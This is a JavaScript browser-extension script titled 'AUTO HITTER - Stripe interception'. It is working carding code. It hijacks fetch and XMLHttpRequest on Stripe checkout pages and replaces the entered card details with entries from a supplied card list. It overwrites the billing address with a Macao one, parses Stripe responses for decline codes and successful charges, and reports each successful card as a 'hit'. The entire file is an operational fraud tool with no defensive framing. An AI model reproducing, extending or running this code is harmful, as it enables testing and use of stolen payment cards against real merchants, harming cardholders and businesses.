// ===================================
// AUTO HITTER - Stripe interception
// payment_methods + payment_pages/confirm (real site error from confirm response)
// ===================================

(function () {
  'use strict';
  if (window.__ARIES_AUTOHIT__) return;
  window.__ARIES_AUTOHIT__ = true;

  let state = { autoHitActive: false, cardList: [], currentIndex: 0, attemptCount: 0, pendingCard: null, lastTriedCard: null, hitSent: false };

  const STRIPE_PM = 'api.stripe.com/v1/payment_methods';
  const STRIPE_CONFIRM = 'api.stripe.com/v1/payment_pages';
  const STRIPE_PI = 'api.stripe.com/v1/payment_intents';

  function isPaymentMethods(url) {
    return url && url.includes(STRIPE_PM) && !url.includes('payment_intents');
  }

  const STRIPE_SETUP = 'api.stripe.com/v1/setup_intents';
  function isConfirmUrl(url) {
    return url && ((url.includes(STRIPE_CONFIRM) && url.includes('/confirm')) || (url.includes(STRIPE_SETUP) && /\/setup_intents\/[^/]+\/confirm/.test(url)));
  }
  function isVerifyChallengeUrl(url) {
    if (!url) return false;
    if (url.includes(STRIPE_SETUP) && /\/setup_intents\/[^/]+\/verify_challenge/.test(url)) return true;
    if (url.includes(STRIPE_PI) && /\/payment_intents\/pi_[^/]+\/verify_challenge/.test(url)) return true;
    return false;
  }
  function isSetupIntentsUrl(url) {
    return url && url.includes(STRIPE_SETUP) && /\/setup_intents\/seti_/.test(url) && !/\/verify_challenge/.test(url);
  }

  function isPaymentIntentsUrl(url) {
    return url && url.includes(STRIPE_PI) && /\/payment_intents\/pi_/.test(url);
  }

  function tryExtractAmount() {
    try {
      const txt = (document.body && document.body.innerText) || '';
      const m = txt.match(/\$[\d,]+\.?\d*/) || txt.match(/USD\s*[\d,]+\.?\d*/i) || txt.match(/€[\d,]+\.?\d*/) || txt.match(/£[\d,]+\.?\d*/) || txt.match(/(\d+\.?\d*)\s*(usd|eur|gbp)/i);
      return m ? m[0] : '';
    } catch (_) { return ''; }
  }

  function extractCheckoutUrl() {
    // Try to extract checkout URL from various sources
    const currentUrl = typeof location !== 'undefined' ? location.href : '';

    // 1. Check if we're already on a checkout URL
    if (currentUrl.includes('checkout.stripe.com') && /\/c\/pay\//.test(currentUrl)) {
      return currentUrl.split('#')[0]; // Remove fragment
    }

    // 2. Try to extract from referrer parameter in Stripe controller URLs
    try {
      const url = new URL(currentUrl);
      const referrer = url.searchParams.get('referrer');
      if (referrer) {
        const decodedReferrer = decodeURIComponent(referrer);
        if (decodedReferrer.includes('checkout.stripe.com') && /\/c\/pay\//.test(decodedReferrer)) {
          return decodedReferrer.split('#')[0]; // Remove fragment
        }
      }
    } catch (e) {}

    // 3. Check document.referrer
    if (typeof document !== 'undefined' && document.referrer) {
      const referrer = document.referrer;
      if (referrer.includes('checkout.stripe.com') && /\/c\/pay\//.test(referrer)) {
        return referrer.split('#')[0]; // Remove fragment
      }
    }

    // 4. Use stored URL if available
    if (state.originalCheckoutUrl) {
      return state.originalCheckoutUrl;
    }

    // 5. Fallback to current URL
    return currentUrl;
  }

  function sendHitOnce(card) {
    if (state.hitSent) return;
    state.hitSent = true;
    const checkoutUrl = extractCheckoutUrl();
    console.log('[sendHitOnce] Sending hit with card:', card, 'URL:', checkoutUrl);
    send('CARD_HIT', {
      card,
      success_url: checkoutUrl,
      amount: tryExtractAmount(),
    });
  }
  function send(type, data) {
    try {
      if (typeof chrome !== 'undefined' && chrome.runtime?.sendMessage) {
        chrome.runtime.sendMessage({ type, ...data });
      } else {
        window.postMessage({ __ariesxhit__: true, type, ...data }, '*');
      }
    } catch (_) {
      window.postMessage({ __ariesxhit__: true, type, ...data }, '*');
    }
  }

  function getNextCard() {
    if (!state.cardList?.length) return null;
    state.hitSent = false;
    const card = state.cardList[state.currentIndex % state.cardList.length];
    state.currentIndex++;
    if (typeof card === 'string') {
      const [n, m, y, cvv] = card.split('|');
      return { number: n, month: m || '12', year: (y || '28').slice(-2), cvv: cvv || '123' };
    }
    return card;
  }

  const MACAO_BILLING = { country: 'MO', line1: '152 Forest Avenue', city: '', state: '', postal_code: '' };
  function getBilling() {
    try {
      const b = window.__ax_billing;
      if (b && b.line1) return { country: b.country || 'MO', line1: b.line1, city: b.city || '', state: b.state || '', postal_code: b.postal_code || '' };
    } catch (_) {}
    return MACAO_BILLING;
  }

  function replaceBillingInBody(bodyStr) {
    const B = getBilling();
    if (!bodyStr) return bodyStr;
    let r = bodyStr;
    const MO = 'MO';
    const line1 = B.line1 || '152 Forest Avenue';
    const line1Enc = encodeURIComponent(line1);
    // billing_details (payment_methods) - match ddddddd format
    r = r.replace(/billing_details%5Baddress%5D%5Bcountry%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bcountry%5D=${MO}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bline1%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bline1%5D=${line1Enc}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bcity%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bcity%5D=${encodeURIComponent(B.city || '')}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bpostal_code%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bpostal_code%5D=${encodeURIComponent(B.postal_code || '')}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bstate%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bstate%5D=${encodeURIComponent(B.state || '')}`);
    r = r.replace(/billing_details\[address\]\[country\]=[^&]*/gi, `billing_details[address][country]=${MO}`);
    r = r.replace(/billing_details\[address\]\[line1\]=[^&]*/gi, `billing_details[address][line1]=${line1Enc}`);
    r = r.replace(/billing_details\[address\]\[city\]=[^&]*/gi, `billing_details[address][city]=${encodeURIComponent(B.city || '')}`);
    r = r.replace(/billing_details\[address\]\[postal_code\]=[^&]*/gi, `billing_details[address][postal_code]=${B.postal_code || ''}`);
    r = r.replace(/billing_details\[address\]\[state\]=[^&]*/gi, `billing_details[address][state]=${B.state || ''}`);
    // payment_method_data (setup_intents/confirm, payment_pages) - match aaa format
    r = r.replace(/payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=[^&]*/gi, `payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=${MO}`);
    r = r.replace(/payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=[^&]*/gi, `payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=${line1Enc}`);
    r = r.replace(/payment_method_data\[billing_details\]\[address\]\[country\]=[^&]*/gi, `payment_method_data[billing_details][address][country]=${MO}`);
    r = r.replace(/payment_method_data\[billing_details\]\[address\]\[line1\]=[^&]*/gi, `payment_method_data[billing_details][address][line1]=${line1Enc}`);
    return r;
  }

  function replaceCardInBody(bodyStr, card) {
    if (!bodyStr || !card) return bodyStr;
    let r = bodyStr;
    const num = encodeURIComponent(card.number);
    const mon = encodeURIComponent(card.month);
    const yr = encodeURIComponent(card.year);
    const cv = encodeURIComponent(card.cvv);
    r = r.replace(/card%5Bnumber%5D=[^&]*/g, `card%5Bnumber%5D=${num}`);
    r = r.replace(/card%5Bexp_month%5D=[^&]*/g, `card%5Bexp_month%5D=${mon}`);
    r = r.replace(/card%5Bexp_year%5D=[^&]*/g, `card%5Bexp_year%5D=${yr}`);
    r = r.replace(/card%5Bcvc%5D=[^&]*/g, `card%5Bcvc%5D=${cv}`);
    r = r.replace(/card\[number\]=[^&]*/g, `card[number]=${card.number}`);
    r = r.replace(/card\[exp_month\]=[^&]*/g, `card[exp_month]=${card.month}`);
    r = r.replace(/card\[exp_year\]=[^&]*/g, `card[exp_year]=${card.year}`);
    r = r.replace(/card\[cvc\]=[^&]*/g, `card[cvc]=${card.cvv}`);
    // payment_method_data[card][*] (setup_intents/confirm, aaa format)
    r = r.replace(/payment_method_data%5Bcard%5D%5Bnumber%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bnumber%5D=${num}`);
    r = r.replace(/payment_method_data%5Bcard%5D%5Bexp_month%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bexp_month%5D=${mon}`);
    r = r.replace(/payment_method_data%5Bcard%5D%5Bexp_year%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bexp_year%5D=${yr}`);
    r = r.replace(/payment_method_data%5Bcard%5D%5Bcvc%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bcvc%5D=${cv}`);
    r = r.replace(/payment_method_data\[card\]\[number\]=[^&]*/g, `payment_method_data[card][number]=${card.number}`);
    r = r.replace(/payment_method_data\[card\]\[exp_month\]=[^&]*/g, `payment_method_data[card][exp_month]=${card.month}`);
    r = r.replace(/payment_method_data\[card\]\[exp_year\]=[^&]*/g, `payment_method_data[card][exp_year]=${card.year}`);
    r = r.replace(/payment_method_data\[card\]\[cvc\]=[^&]*/g, `payment_method_data[card][cvc]=${card.cvv}`);
    return r;
  }

  function bodyToString(b) {
    if (!b) return '';
    if (typeof b === 'string') return b;
    if (b instanceof URLSearchParams) return b.toString();
    if (b instanceof FormData) {
      const p = new URLSearchParams();
      b.forEach((v, k) => p.append(k, v));
      return p.toString();
    }
    if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
    try {
      return JSON.stringify(b);
    } catch (_) {
      return '';
    }
  }

  function parseResponse(text) {
    try {
      return JSON.parse(text);
    } catch (_) {
      return null;
    }
  }

  const origFetch = window.fetch;
  window.fetch = async function (input, init) {
    let url = typeof input === 'string' ? input : input?.url;
    const method = init?.method || input?.method || 'GET';
    let body = init?.body ?? input?.body;

    if (isPaymentMethods(url) && state.autoHitActive && method === 'POST') {
      const bodyStr = bodyToString(body);
      const card = getNextCard();
      if (card && bodyStr) {
        state.attemptCount++;
        const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
        state.lastTriedCard = cardStr;
        send('CARD_TRYING', { attempt: state.attemptCount, card: cardStr });
        let newBody = replaceCardInBody(bodyStr, card);
        newBody = replaceBillingInBody(newBody);
        const opts = { ...(init || {}), method, body: newBody };
        if (init?.headers) opts.headers = init.headers;
        const res = await origFetch.call(window, url, opts);
        const clone = res.clone();
        clone.text().then((text) => {
          const data = parseResponse(text);
          if (data?.error?.code) {
            const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code;
            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || state.lastTriedCard });
          } else if (data?.id && String(data.id).startsWith('pm_') && !data?.error) {
            state.pendingCard = cardStr;
          }
        });
        return res;
      }
    }
    if (isConfirmUrl(url) && state.autoHitActive && method === 'POST') {
      const res = await origFetch.call(window, input, init);
      const clone = res.clone();
      clone.text().then((text) => {
        const data = parseResponse(text);
        const card = state.pendingCard;
        if (data?.error) {
          state.pendingCard = null;
          const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code || 'declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || state.lastTriedCard });
        } else if (card && !data?.error) {
          const status = data?.payment_intent?.status || data?.status;
          const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
          if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
            state.pendingCard = null;
            sendHitOnce(card);
          }
        }
      });
      return res;
    }
    if (isPaymentIntentsUrl(url) && state.autoHitActive && method === 'GET') {
      const res = await origFetch.call(window, input, init);
      res.clone().text().then((text) => {
        const data = parseResponse(text);
        if (!data) return;
        const status = data.status;
        const lastErr = data.last_payment_error;
        const card = state.pendingCard;
        if (status === 'succeeded' && card) {
          state.pendingCard = null;
          sendHitOnce(card);
        } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
          state.pendingCard = null;
          const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: lastErr.message || decline_code, card });
        }
      });
      return res;
    }
    if (isVerifyChallengeUrl(url) && state.autoHitActive && method === 'POST') {
      const res = await origFetch.call(window, input, init);
      res.clone().text().then((text) => {
        const data = parseResponse(text);
        if (!data) return;
        const err = data.last_setup_error || data.last_payment_error;
        if (err && (err.decline_code || err.code)) {
          state.pendingCard = null;
          const decline_code = err.decline_code || err.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || state.lastTriedCard });
        } else if (data.status === 'succeeded' && !err) {
          const card = state.pendingCard || state.lastTriedCard;
          state.pendingCard = null;
          sendHitOnce(card);
        }
      });
      return res;
    }
    if (isSetupIntentsUrl(url) && state.autoHitActive && (method === 'GET' || method === 'POST')) {
      const res = await origFetch.call(window, input, init);
      res.clone().text().then((text) => {
        const data = parseResponse(text);
        if (!data || data.object !== 'setup_intent') return;
        if (data.status === 'succeeded' && !data.last_setup_error) {
          const card = state.pendingCard || state.lastTriedCard;
          state.pendingCard = null;
          sendHitOnce(card);
        }
      });
      return res;
    }
    if (input instanceof Request) return origFetch.call(window, input, init);
    return origFetch.call(window, url, init || {});
  };

  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url) {
    this._url = url;
    this._method = method;
    return origOpen.apply(this, arguments);
  };
  const origSendXHR = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (body) {
    const url = this._url;
    const method = this._method;
    if (isConfirmUrl(url) && state.autoHitActive && method === 'POST') {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        const card = state.pendingCard;
        if (data?.error) {
          state.pendingCard = null;
          const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code || 'declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || state.lastTriedCard });
        } else if (card && !data?.error) {
          const status = data?.payment_intent?.status || data?.status;
          const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
          if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
            state.pendingCard = null;
            sendHitOnce(card);
          }
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isPaymentIntentsUrl(url) && state.autoHitActive && method === 'GET') {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        if (!data) return;
        const status = data.status;
        const lastErr = data.last_payment_error;
        const card = state.pendingCard;
        if (status === 'succeeded' && card) {
          state.pendingCard = null;
          sendHitOnce(card);
        } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
          state.pendingCard = null;
          const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: lastErr.message || decline_code, card });
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isVerifyChallengeUrl(url) && state.autoHitActive && method === 'POST') {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        if (!data) return;
        const err = data.last_setup_error || data.last_payment_error;
        if (err && (err.decline_code || err.code)) {
          state.pendingCard = null;
          const decline_code = err.decline_code || err.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || state.lastTriedCard });
        } else if (data.status === 'succeeded' && !err) {
          const card = state.pendingCard || state.lastTriedCard;
          state.pendingCard = null;
          sendHitOnce(card);
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isSetupIntentsUrl(url) && state.autoHitActive && (method === 'GET' || method === 'POST')) {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        if (!data || data.object !== 'setup_intent') return;
        if (data.status === 'succeeded' && !data.last_setup_error) {
          const card = state.pendingCard || state.lastTriedCard;
          state.pendingCard = null;
          sendHitOnce(card);
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isPaymentMethods(url) && state.autoHitActive && method === 'POST') {
      const bodyStr = bodyToString(body);
      const card = getNextCard();
      if (card && bodyStr) {
        state.attemptCount++;
        const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
        state.lastTriedCard = cardStr;
        send('CARD_TRYING', { attempt: state.attemptCount, card: cardStr });
        let newBody = replaceCardInBody(bodyStr, card);
        newBody = replaceBillingInBody(newBody);
        this.addEventListener('load', function () {
          const data = parseResponse(this.responseText);
          if (data?.error?.code) {
            const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code;
            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || state.lastTriedCard });
          } else if (data?.id && String(data.id).startsWith('pm_') && !data?.error) {
            state.pendingCard = cardStr;
          }
        });
        return origSendXHR.call(this, newBody);
      }
    }
    return origSendXHR.apply(this, arguments);
  };

  async function init() {
    try {
      const r = await chrome.runtime.sendMessage({ type: 'GET_STATE' });
      if (r) {
        state.autoHitActive = r.autoHitActive ?? false;
        state.cardList = r.cardList ?? [];
      }
    } catch (_) {}

    // Store the original checkout URL if we're on a checkout page
    if (typeof location !== 'undefined' && location.href) {
      const url = location.href.toLowerCase();
      if (url.includes('checkout.stripe.com') || url.includes('stripe.com/c/pay') || /\/c\/pay\/|\/pay\/|checkout|billing/i.test(location.href)) {
        state.originalCheckoutUrl = location.href.split('#')[0]; // Store without fragment
      }
    }
  }
  init();

  document.addEventListener('aries-state-update', (e) => {
    const d = e.detail || {};
    state.autoHitActive = d.autoHitActive ?? state.autoHitActive;
    state.cardList = d.cardList ?? state.cardList;
    if (d.resetAttempts) state.attemptCount = 0;
  });
})();
